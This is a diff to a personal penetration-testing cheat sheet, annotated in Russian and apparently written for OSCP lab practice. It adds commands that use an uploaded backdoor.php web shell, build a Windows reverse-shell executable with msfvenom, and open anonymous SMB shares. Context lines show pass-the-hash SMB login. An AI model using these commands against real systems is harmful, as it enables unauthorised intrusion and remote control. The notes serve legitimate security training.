@@ -89,6 +89,8 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 	однострочные reverse шелы
+curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=which nc"
+	кодирование в строке запроса "?cmd=which nc"
 Ctrl+U/Ctrl+Shift+U
 	кодирование/декодирование спец. сиволов в Burp
 
@@ -300,6 +302,8 @@ msfconsole
 
 searchsploit samba2.2.1a
 	поиск уязвимостей и эксплоитов по версии
+searchsploit -m 50944
+	копирование эксплоита в локальную папку (-m - mirror)
 
 /usr/share/metaslpoit-framework/tools/exploit/pattern_create.rb -l 3000
 	создать нагрузку длиной 3000 байт для отправки в уязвимое приложение 
@@ -310,12 +314,16 @@ searchsploit samba2.2.1a
 msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
 	генерирование шел кода с IP <attacker ip>, в формате си, плохие символы - 0x0,
 	предварительно надо запустить nc -lnvp 4444 на атакующей машине
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.215 LPORT=4444 EXITFUNC=thread -f exe -o shellcode.exe
+	генерирование шел кода в виде файла
 
 mona.py на github - плагин для Immunity debugger для проверки, какие модули не имеют защиты ASLR, SEH и др.
                       
 ==========SAMBA	445                                   
 smbclient -L \\\\ip\\
 	попытка подключения к samba серверу, smbclient \\\\ip\\ IPC$
+smbclient \\\\ip\\folder -N
+	анонимное подключение без пароля к папке folder самба сервера
 smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
 	соединение к удаленной машине с хешем пользователя
 sudo impacket-smbserver config /home/user/re/oscp/labs/webdav -smb2support 
